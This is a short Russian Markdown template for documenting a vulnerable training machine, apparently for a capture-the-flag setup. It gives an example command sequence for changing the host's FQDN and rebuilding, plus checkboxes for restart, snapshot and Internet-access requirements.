# Донастройка хоста

_Здесь должны быть команды, которые нужно выполнить после развертывания образа. Например, команда меняющая хостнейм машины на образе, который вы загрузите (т.н. эталонный образ)._

Пример:
## Смена FQDN

 ```bash
sed -i 's/dokumentik\.city\.stf/YOUR_FQDN/g' \
	/etc/hosts \
	/opt/example/dokumentik/something.ts
cd /opt/example/dokumentik && \
/usr/local/bin/bun run build && \
hostnamectl set-hostname YOUR_FQDN && \
reboot now
```

# Уязвимый стенд   
_Здесь должны быть команды, которые позволяют проверить статус сервисов или их перезапуск._

Пример:

_Отметьте галочками или крестиками:_
❌ /✅ Уязвимую машину можно **перезапускать**
❌ /✅ Последний снапшот должен быть **с памятью**
❌ /✅ Сервису нужен доступ **в Интернет**

## Смена флагов
